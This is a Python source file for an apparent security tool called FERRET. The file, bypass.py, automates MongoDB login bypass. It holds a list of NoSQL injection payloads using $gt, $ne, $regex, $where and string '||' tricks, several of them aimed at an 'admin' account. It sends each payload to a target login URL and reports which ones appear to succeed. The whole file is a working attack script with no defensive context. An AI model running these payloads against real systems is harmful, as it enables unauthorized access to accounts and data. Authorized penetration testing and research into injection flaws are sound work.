# ============================================================
#  FERRET - bypass.py
#  Attempts MongoDB login bypass using NoSQL operators
# ============================================================

import requests
import json
from colorama import Fore, Style, init
init(autoreset=True)

GREEN  = Fore.GREEN
RED    = Fore.RED
YELLOW = Fore.YELLOW
CYAN   = Fore.CYAN
BOLD   = Style.BRIGHT
RESET  = Style.RESET_ALL

# MongoDB login bypass payloads
BYPASS_PAYLOADS = [
    # Operator based
    {"username": {"$gt": ""},  "password": {"$gt": ""}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": {"$ne": ""},  "password": {"$ne": ""}},
    {"username": {"$exists": True}, "password": {"$exists": True}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},

    # Admin targeting
    {"username": "admin", "password": {"$gt": ""}},
    {"username": "admin", "password": {"$ne": None}},
    {"username": "admin", "password": {"$exists": True}},
    {"username": "admin", "password": {"$regex": ".*"}},

    # Always true conditions
    {"username": {"$where": "1==1"}, "password": {"$where": "1==1"}},
    {"username": {"$or": [{"a": 1}, {"a": 1}]}, "password": {"$gt": ""}},

    # String based
    {"username": "admin'||'1'=='1", "password": "x"},
    {"username": "admin", "password": "' || '1'=='1"},
]

class Bypass:
    def __init__(self, url, username_field="username",
                 password_field="password", headers=None,
                 method="POST", timeout=10):
        self.url            = url
        self.username_field = username_field
        self.password_field = password_field
        self.headers        = headers or {"Content-Type": "application/json"}
        self.method         = method.upper()
        self.timeout        = timeout
        self.successes      = []

    def _send(self, payload):
        try:
            if self.method == "POST":
                resp = requests.post(
                    self.url,
                    json=payload,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                resp = requests.get(
                    self.url,
                    params=payload,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            return resp
        except requests.exceptions.ConnectionError:
            print(f"{RED}[ERROR] Cannot connect to {self.url}{RESET}")
            return None
        except requests.exceptions.Timeout:
            print(f"{YELLOW}[TIMEOUT] Request timed out{RESET}")
            return None

    def _is_success(self, resp):
        """Detect successful login from response"""
        success_keywords = [
            "welcome", "dashboard", "logout", "token",
            "success", "admin", "home", "profile",
            "logged in", "authenticated"
        ]
        failure_keywords = [
            "invalid", "incorrect", "wrong", "failed",
            "unauthorized", "error", "denied"
        ]

        text = resp.text.lower()

        # Check status codes
        if resp.status_code in [200, 301, 302]:
            # Check for success keywords
            if any(k in text for k in success_keywords):
                return True
            # Check absence of failure keywords
            if not any(k in text for k in failure_keywords):
                return True

        return False

    def run(self):
        print(f"\n{CYAN}{BOLD}[*] Starting login bypass on: {self.url}{RESET}")
        print(f"{CYAN}[*] Username field: {self.username_field}{RESET}")
        print(f"{CYAN}[*] Password field: {self.password_field}{RESET}")
        print(f"{CYAN}[*] Testing {len(BYPASS_PAYLOADS)} bypass payloads...{RESET}\n")

        for i, payload_template in enumerate(BYPASS_PAYLOADS, 1):
            # Map generic keys to actual field names
            payload = {}
            for key, value in payload_template.items():
                if key == "username":
                    payload[self.username_field] = value
                elif key == "password":
                    payload[self.password_field] = value
                else:
                    payload[key] = value

            print(f"  [{i}/{len(BYPASS_PAYLOADS)}] Testing: {json.dumps(payload)[:80]}...")

            resp = self._send(payload)
            if resp is None:
                continue

            if self._is_success(resp):
                result = {
                    "payload":  payload,
                    "status":   resp.status_code,
                    "length":   len(resp.text),
                    "response": resp.text[:200]
                }
                self.successes.append(result)
                print(f"  {GREEN}{BOLD}[BYPASS SUCCESS!] Status: {resp.status_code} | Length: {len(resp.text)}{RESET}")
                print(f"  {GREEN}Payload: {json.dumps(payload)}{RESET}")
                print(f"  {YELLOW}Response preview: {resp.text[:150]}{RESET}\n")
            else:
                print(f"  {RED}[-] Failed — Status: {resp.status_code}{RESET}")

        print(f"\n{CYAN}[*] Bypass complete. {len(self.successes)} successful bypass(es) found.{RESET}\n")
        return self.successes